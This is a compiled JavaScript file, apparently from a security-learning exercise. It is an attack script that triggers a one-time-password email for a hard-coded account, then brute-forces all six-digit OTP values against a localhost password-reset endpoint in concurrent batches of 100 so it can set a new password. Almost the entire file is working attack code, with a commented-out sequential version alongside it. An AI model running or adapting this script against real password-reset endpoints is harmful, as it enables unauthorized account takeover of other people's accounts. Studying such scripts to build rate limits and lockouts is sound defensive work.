"use strict";
// so now here we will write the attacker logic
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const axios_1 = __importDefault(require("axios"));
// so now here trying for all otp here 
const email = "ashokgupa";
const password = "ashokgupta";
// first send the request to that email to generate the otp then we will try to hack the otp then 
function generateOtp(email) {
    return __awaiter(this, void 0, void 0, function* () {
        try {
            const res = yield axios_1.default.post("http://localhost:3000/generate-otp", {
                "email": email
            });
            console.log("OTP generated successfully"); // Indicate OTP generation
        }
        catch (error) {
            console.error("Error generating OTP:", error);
        }
    });
}
function bruteForce(email, otp, newPassword) {
    return __awaiter(this, void 0, void 0, function* () {
        // so doing the axiso post request
        try {
            const res = yield axios_1.default.post("http://localhost:3000/reset-passowrd", {
                email: email,
                otp: otp,
                newPassword: newPassword
            });
            if (res.status === 200) {
                return true;
            }
            else {
                return false;
            }
        }
        catch (error) {
            return false;
        }
    });
}
function go() {
    return __awaiter(this, void 0, void 0, function* () {
        try {
            // Await the OTP generation before starting brute force
            yield generateOtp(email);
            // for (var i = 100000; i < 1000000; i++) {
            //     var str = String(i);
            //     const res = await bruteForce(email, str, password);
            //     if (res === true) {
            //         console.log(`otp for the ${email} is ${str} and new passoword is ${password}`);
            //         break;
            //     } else {
            //         console.log(`Trying otp ${str}`);
            //     }
            // }
            // may be it's good to send request in batches instead of awaiting each of them 
            for (var i = 100000; i < 1000000; i += 100) {
                var p = [];
                var found = false;
                console.log(`trying for batach starting with ${i}`);
                for (var j = 0; j < 100; j++) {
                    // sending the batach of 100
                    var str = String(i + j);
                    p.push(bruteForce(email, str, password));
                }
                // awaiting result for all this promise 
                const results = yield Promise.all(p);
                for (var j = 0; j < 100; j++) {
                    if (results[j] === true) {
                        console.log(`otp for the ${email} is ${i + j} and new passoword is ${password}`);
                        found = true;
                        break;
                    }
                }
                if (found) {
                    break;
                }
            }
            console.log("Brute force finished"); // Indicate completion
        }
        catch (err) {
            console.error(err);
        }
    });
}
go();
